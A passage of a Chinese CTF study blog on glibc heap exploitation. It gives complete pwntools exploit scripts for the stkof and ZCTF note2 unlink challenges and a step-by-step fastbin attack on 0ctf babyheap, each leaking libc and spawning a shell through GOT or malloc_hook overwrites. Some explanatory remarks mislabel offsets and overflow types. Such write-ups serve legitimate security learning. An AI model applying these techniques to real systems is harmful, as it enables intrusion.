<li><p>栈溢出那就leak一下就行了</p>
</li>
</ul>
</li>
</ul>
<h3 id="got表和plt表"><a href="#got表和plt表" class="headerlink" title="got表和plt表"></a>got表和plt表</h3><ul>
<li><strong>.got</strong></li>
</ul>
<p>GOT（Global Offset Table）全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。</p>
<ul>
<li><strong>.plt</strong></li>
</ul>
<p>PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 <code>.got.plt</code> 节中拿到地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时，触发「链接器」去找到所需地址</p>
<ul>
<li><strong>.got.plt</strong></li>
</ul>
<p>这个是 GOT 专门为 PLT 专门准备的节。说白了，<strong>.got.plt 中的值是 GOT 的一部分</strong>。它包含上述  PLT 表所需地址（已经找到的和需要去触发的）</p>
<p>我们说的覆写plt表指的是.got.plt，通过调试得出</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201108032958022.png" alt="image-20201108032958022"></p>
<h3 id="第一个add"><a href="#第一个add" class="headerlink" title="第一个add"></a>第一个add</h3><p>没有setbuf，把输入输出缓冲区申请好。</p>
<h3 id="globals（head）"><a href="#globals（head）" class="headerlink" title="globals（head）"></a>globals（head）</h3><p>所有chunk存储的位置</p>
<p>chunk开始的地方</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201108031201127.png" alt="image-20201108031201127"></p>
<p><img src="/2020/11/11/02-45-undefined/image-20201108010322075.png" alt="image-20201108010322075"></p>
<p>v2是分配的数据指针，而v2是存储在bss段上的，没有开启pie，所以是不变的。</p>
<h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p><img src="/2020/11/11/02-45-undefined/image-20201108012152824.png" alt="image-20201108012152824"></p>
<p>edit函数中，因为修改的长度是自己输入的，那我想改多少改多少，存在堆溢出</p>
<h3 id="unlink的具体操作"><a href="#unlink的具体操作" class="headerlink" title="unlink的具体操作"></a>unlink的具体操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x30</span>)  <span class="comment"># idx 2</span></span><br><span class="line"><span class="comment"># small chunk size inorder to trigger unlink</span></span><br><span class="line">alloc(<span class="number">0x80</span>)  <span class="comment"># idx 3</span></span><br><span class="line"><span class="comment"># a fake chunk at global[2]=head+16 who's size is 0x20</span></span><br><span class="line">payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></span><br><span class="line">payload += p64(<span class="number">0x20</span>)  <span class="comment">#size</span></span><br><span class="line">payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)  <span class="comment">#fd</span></span><br><span class="line">payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>)  <span class="comment">#bk</span></span><br><span class="line">payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk's prev_size bypass the check</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># overwrite global[3]'s chunk's prev_size</span></span><br><span class="line"><span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, len(payload), payload)</span><br><span class="line"><span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span></span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>分配两个chunk，对第一个chunk进行修改，其中bk和fd放成<code>target - 12</code>和<code>target - 8</code></p>
<p>20是因为-12和-8是伪造一个堆块，大小为0x10，被释放了，所以，检查机制会看下一个堆块的prev_size</p>
<p>30和90是下一个chunk的头，也就是上chunk3的上一个chunk在chunk2，90表示被释放了</p>
<h5 id="unlink的结果"><a href="#unlink的结果" class="headerlink" title="unlink的结果"></a>unlink的结果</h5><p><img src="/2020/11/11/02-45-undefined/image-20201108031435390.png" alt="image-20201108031435390"></p>
<p>所以，接下来往chunk2写入数据就会从0x602138开始。。。</p>
<p>注意的是：0x602140仍旧是global[0]的起始地址，那么，覆盖40-58的地址，用global[0\1\2]就可以调用到。</p>
<p>执行结果如下：</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201108031836380.png" alt="image-20201108031836380"></p>
<h3 id="got表"><a href="#got表" class="headerlink" title="got表"></a>got表</h3><p>所以，现在edit(0)，就会往第一个地址里面写入数据。</p>
<p>如果第一个是某个got表地址，那么写入的话，got表里面的内容就可能被替换掉了。</p>
<h3 id="free-1"><a href="#free-1" class="headerlink" title="free(1)"></a>free(1)</h3><p>因为这里，第一个指针地址是puts的got表地址（参数），free的got表也被替换为puts的plt表（原来的执行plt实际上就是执行.got.plt，所以一样），所以执行free函数的话，执行的是put.plt，参数是puts的got表地址</p>
<h3 id="edit-2-len-payload-payload"><a href="#edit-2-len-payload-payload" class="headerlink" title="edit(2, len(payload), payload)"></a>edit(2, len(payload), payload)</h3><p>这里修改的2就直接是88，atoi的got表里面的数据，然后继续执行的时候，会让输入，把binsh给他们就行。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./stkof"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./stkof"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">head = <span class="number">0x00602140</span></span><br><span class="line"><span class="comment">#x/30gx 0x00602140</span></span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)</span><br><span class="line">payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x0</span>)+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:] + <span class="string">'\x00\x00'</span>)</span><br><span class="line">print(<span class="string">"[*]puts_addr:"</span>,hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">p.send(p64(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p>对于程序自己重写read等功能，要看一下，因为很可能就是做了一定的变动，导致可能存在某个漏洞。</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201111021534976.png" alt="image-20201111021534976"></p>
<p>本题中主要是ReadStr这个函数，由于是i是无符号数，所以在比较<code>len - 1 &gt; i</code>时，会把它转换为无符号数，如果len = 0，那么长度就变成了0xfffffffff，如果<code>ReadStr(note, size, 10);</code>就可以往note里面写入很多的数据，造成堆溢出。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本题的主要漏洞就在于这个点，利用堆溢出，可以实现unlink功能。</p>
<p>堆块的指针存在于ptr，地址为<code>0x00602120</code></p>
<p>首先申请一个块，由于有大小限制，就申请最大的0x80，在里面伪造块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x00602120</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x8</span> + p64(<span class="number">0x60</span>)<span class="comment">#0x60和0x61都可</span></span><br><span class="line">payload += p64(ptr - <span class="number">0x18</span>) + p64(ptr - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">64</span></span><br><span class="line">payload += p64(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x80</span>,payload)</span><br></pre></td></tr></table></figure>

<p>因为只有大小为0的才能栈溢出，所以我们申请一个大小为0的块作为中介。</p>
<p>但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。</p>
<p>最后再申请一个正常的堆块，0x80。</p>
<p>这时，堆布局如下：</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201111022359588.png" alt="image-20201111022359588"></p>
<p>因为大小为0的堆块只有在add的时候，读入才堆溢出。所以我们先把它释放，再重新申请，因为大小一样，会把释放掉的给我们重新分配回来。</p>
<p>这时候，就可以把下一个堆块的头给覆盖了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x8</span>*<span class="number">2</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>因为是释放chunk3，却要让它unlink chunk1，所以prev_size要是和chunk1的距离，这样，chunk3会根据自己的地址 - prev_size找到前一个chunk是chunk1。</p>
<p>然后free2，就成功unlink了。</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201111022859025.png" alt="image-20201111022859025"></p>
<p>然后，就可以正常了。</p>
<p>覆盖指针的地址为atoi_got表地址，show泄漏他的地址，找到libc基址，找到system的地址，然后覆盖原来的atoi_got的地址，然后执行的atoi函数的时候，发送‘/bin/sh’即可，这里可以是它的地址也可以是字符串。</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./note2"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./note2"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<span class="comment">#给的libc版本是2.19但是不好使呀，要用2.23的</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.sendline(<span class="string">"winter"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"address:"</span>)</span><br><span class="line">p.sendline(<span class="string">"qh"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"(less than 128)"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"id of the note:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,choice,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">" the note:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"[1.overwrite/2.append]"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"the note:"</span>)</span><br><span class="line">	p.sendline(str(idx))	</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x00602120</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x8</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(ptr - <span class="number">0x18</span>) + p64(ptr - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">64</span></span><br><span class="line">payload += p64(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">"bbbbbbbb"</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x8</span>*<span class="number">2</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">atoi_got = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = atoi_got - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">payload = p64(system)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"option---&gt;&gt;"</span>)</span><br><span class="line">p.sendline(p64(binsh))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="unlink总结"><a href="#unlink总结" class="headerlink" title="unlink总结"></a>unlink总结</h2><ol>
<li>要伪造堆块</li>
<li>可以溢出覆盖下一个堆块的头</li>
<li>unlink是函数指针</li>
</ol>
<blockquote>
<p>unlink先到这里，，等有空再做剩下几题。。。</p>
</blockquote>
<h1 id="花式栈溢出技巧"><a href="#花式栈溢出技巧" class="headerlink" title="花式栈溢出技巧"></a>花式栈溢出技巧</h1><h2 id="stack-pivoting（栈迁移）"><a href="#stack-pivoting（栈迁移）" class="headerlink" title="stack pivoting（栈迁移）"></a>stack pivoting（栈迁移）</h2><p>第一题是直接用jmp esp进行栈迁移的</p>
<p><img src="/2020/11/11/02-45-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201112211503737.png" alt="image-20201112211503737"></p>
<p>题目很简单，一个栈溢出，但是溢出字节不是很多，只有50 - 0x20-0x4（ebp） = 14个字节，难以利用。</p>
<p>因为这里是存在栈上而不是bss段上，所以不能用ret2shellcode（不知道输入的具体地址）</p>
<p>所以</p>
<h1 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h1><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><p><img src="/2020/11/11/02-45-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201118233314339.png" alt="image-20201118233314339"></p>
<p>64位的程序，保护全开</p>
<p><img src="/2020/11/11/02-45-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201118233342993.png" alt="image-20201118233342993"></p>
<p>填充内容的时候，长度是重新输入的，可以填充任意长度，造成栈溢出</p>
<p><img src="/2020/11/11/02-45-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201118233449344.png" alt="image-20201118233449344"></p>
<p>没有uaf</p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>主要的漏洞：任意长度堆溢出</p>
<ul>
<li><p>利用<strong>unsortedbin</strong>地址<strong>泄漏libc基地址</strong></p>
</li>
<li><p>利用<strong>fastbin attack</strong>将chunk分配到<strong>malloc_hook</strong>附近</p>
</li>
</ul>
<h4 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h4><blockquote>
<p>要利用unsortedbin泄漏，所以，要让两个块同时指向unsortedbin地址。</p>
<p>第一部分：</p>
<p>所以，一开始，首先将大小为0x80的块同时被认为是chunk2。方法是释放chunk2和chunk1，修改1的fd（原本指向chunk2），现在修改为chunk4，那么申请回来的时候chunk2实际是chunk4的内容。这里为了绕过检查，要让chunk4的大小为0x10。</p>
<p>接着，让chunk4的地址变回0x80，为了防止和top chunk合并，多申请一个chunk5，接着释放chunk4进入unsortedbin（chunk被释放后，如果大小不再fastbin内，会先放到unsortedbin中），chunk4里面的指针指向unsortedbin的链表头，用它可以计算出main_arena和libc的地址</p>
<p>第二部分：</p>
<p>因为malloc_hook附近有0x7f可用，找到一个合适的地方，申请堆块到这里，然后覆盖malloc_hook为one_gadget地址，再malloc任意值即可得到shell。</p>
</blockquote>
<h5 id="1-前期申请"><a href="#1-前期申请" class="headerlink" title="1.前期申请"></a>1.前期申请</h5><p>5个chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#4</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40gx 0x55b474ad1000</span><br><span class="line">0x55b474ad1000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b474ad1010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b474ad1020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b474ad1030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b474ad1040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b474ad1050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b474ad1060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b474ad1070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b474ad1080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55b474ad1090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h5 id="2-令另一个chunk分配到chunk4"><a href="#2-令另一个chunk分配到chunk4" class="headerlink" title="2.令另一个chunk分配到chunk4"></a>2.令另一个chunk分配到chunk4</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(2)</span><br><span class="line">free(1)</span><br></pre></td></tr></table></figure>

<p>链表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x55a609172020(1) —▸ 0x55a609172040(2) ◂— 0x0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE(1)</span><br><span class="line">Addr: 0x55a609172020</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x55a609172040</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE(2)</span><br><span class="line">Addr: 0x55a609172040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br></pre></td></tr></table></figure>

<p>本来chunk1是指向chunk2的，修改最低8位，（因为开了pie，但是最低3字节不变），这样chunk1就指向chunk4了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x556f686e7020(1) —▸ 0x556f686e7080(4) ◂— 0x0</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/11/02-45-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201118235420360.png" alt="image-20201118235420360"></p>
<p>接着修改chunk4的大小，方便绕过检查</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br></pre></td></tr></table></figure>

<p>这样接着申请两个0x10的堆块时候，一个是原来的chunk1不变，chunk2变成了chunk4</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2 -&gt; 4</span></span><br></pre></td></tr></table></figure>

<p>以后，使用chunk2，实际的操作在chunk4里面</p>
<h5 id="3-将chunk4放入到unsortbin中"><a href="#3-将chunk4放入到unsortbin中" class="headerlink" title="3.将chunk4放入到unsortbin中"></a>3.将chunk4放入到unsortbin中</h5><p>只要修改大小为0x80，然后释放掉即可。</p>
<p>这里为了防止与top chunk合并，所以在释放申请前，再申请一个chunk5</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>现在，chunk2和chunk4指向相同的地址，而chunk4是unsortedbin中唯一的chunk，fd指针指向的是unsortedbin的链表，用chunk2就可以打印出它</p>
